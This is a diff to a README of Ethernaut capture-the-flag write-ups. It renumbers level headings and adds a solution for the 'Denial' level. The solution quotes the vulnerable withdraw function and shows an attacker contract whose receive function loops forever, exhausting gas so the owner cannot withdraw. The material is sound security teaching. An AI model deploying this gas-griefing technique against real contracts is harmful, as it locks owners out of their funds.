@@ -335,24 +335,44 @@ await tx.wait();
 
 ## 17 - Recovery
 
-## 19 - MagicNumber
+## 18 - MagicNumber
 
-## 20 - AlienCodex
+## 19 - AlienCodex
 
-## 21 - Denial
+## 20 - Denial
 
-## 22 - Shop
+The goal of this challenge is to perform a DOS on the contract, when the owner tries to use the `withdraw`:
 
-## 23 - DEX
-
-## 24 - DEX TWO
-
-## 25 - Puzzle Wallet
-
-## 26 - Motorbike
-
-## 27 - DoubleEntryPoint
+```solidity
+function withdraw() public {
+  uint256 amountToSend = address(this).balance.div(100);
+  partner.call{ value: amountToSend }("");
+  owner.transfer(amountToSend);
+}
 
 ```
 
+The `partner` can be set, and it can be a contract. So it is a good target to perform an attack when it receives ether.
+
+As the purpose of the challenge is to deny the service, spending all the gas on the `receive` function from the attacker contract is enough. It can be done with some `while` loop, for example:
+
+```solidity
+receive() external payable {
+  while (true) {}
+}
+
 ```
+
+[Script](./scripts/20-Denial.ts) | [Test](./test/20-Denial.spec.ts)
+
+## 21 - Shop
+
+## 22 - DEX
+
+## 23 - DEX TWO
+
+## 24 - Puzzle Wallet
+
+## 25 - Motorbike
+
+## 26 - DoubleEntryPoint
